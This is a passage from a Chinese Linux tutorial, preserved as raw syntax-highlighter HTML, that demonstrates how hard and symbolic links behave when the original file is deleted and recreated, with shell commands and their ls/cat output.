&lt;p&gt;为log2013.log创建硬链接ln2013，log2013.log与ln2013的各项属性相同&lt;/p&gt;
&lt;p&gt;实例3：接上面两实例，链接完毕后，删除和重建链接原文件&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587aa01f3934b828501668&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;span class=&quot;crayon-language&quot;&gt;Shell&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 2 root bin      61 11-13 06:03 ln2013

-rw-r--r-- 2 root bin      61 11-13 06:03 log2013.log

[root@localhost test]# rm -rf log2013.log 

[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 ln2013

[root@localhost test]# touch log2013.log

[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 ln2013

---xrw-r-- 1 root bin  302108 11-13 06:03 log2012.log

-rw-r--r-- 1 root root      0 12-07 16:19 log2013.log

[root@localhost test]# vi log2013.log 

2013-01

2013-02

2013-03

2013-04

2013-05

2013-06

2013-07

2013-08

2013-09

2013-10

2013-11

2013-12[root@localhost test]# ll

lrwxrwxrwx 1 root root     11 12-07 16:01 link2013 -&amp;gt; log2013.log

-rw-r--r-- 1 root bin      61 11-13 06:03 ln2013

-rw-r--r-- 1 root root     96 12-07 16:21 log2013.log

[root@localhost test]# cat link2013 

2013-01

2013-02

2013-03

2013-04

2013-05

2013-06

2013-07

2013-08

2013-09

2013-10

2013-11

2013-12

[root@localhost test]# cat ln2013 

hostnamebaidu=baidu.com

hostnamesina=sina.com

hostnames=true&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-64&quot;&gt;64&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-65&quot;&gt;65&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-66&quot;&gt;66&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-67&quot;&gt;67&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-68&quot;&gt;68&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-69&quot;&gt;69&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-70&quot;&gt;70&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-71&quot;&gt;71&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-72&quot;&gt;72&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-73&quot;&gt;73&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-74&quot;&gt;74&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-75&quot;&gt;75&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-76&quot;&gt;76&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-77&quot;&gt;77&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-78&quot;&gt;78&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-79&quot;&gt;79&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-80&quot;&gt;80&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-81&quot;&gt;81&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-82&quot;&gt;82&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-83&quot;&gt;83&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-84&quot;&gt;84&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-85&quot;&gt;85&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-86&quot;&gt;86&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-87&quot;&gt;87&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-88&quot;&gt;88&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-89&quot;&gt;89&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-90&quot;&gt;90&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-91&quot;&gt;91&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-92&quot;&gt;92&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587aa01f3934b828501668-93&quot;&gt;93&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-1&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-2&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-3&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-4&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-5&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-7&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-8&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-9&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# rm -rf log2013.log &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-11&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-12&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-13&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;lrwxrwxrwx&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;link2013&lt;/span&gt; &lt;span class=&quot;crayon-o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;crayon-v&quot;&gt;log2013&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-14&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-15&quot;&gt;
&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;root&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;bin&lt;/span&gt;      &lt;span class=&quot;crayon-cn&quot;&gt;61&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;13&lt;/span&gt; &lt;span class=&quot;crayon-cn&quot;&gt;06&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;03&lt;/span&gt; &lt;span class=&quot;crayon-i&quot;&gt;ln2013&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-17&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# touch log2013.log&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-18&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-19&quot;&gt;
&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;localhost&lt;/span&gt; &lt;span class=&quot;crayon-r&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;# ll&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587aa01f3934b828501668-20&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587aa01f3934b828501668-21&quot;&gt;
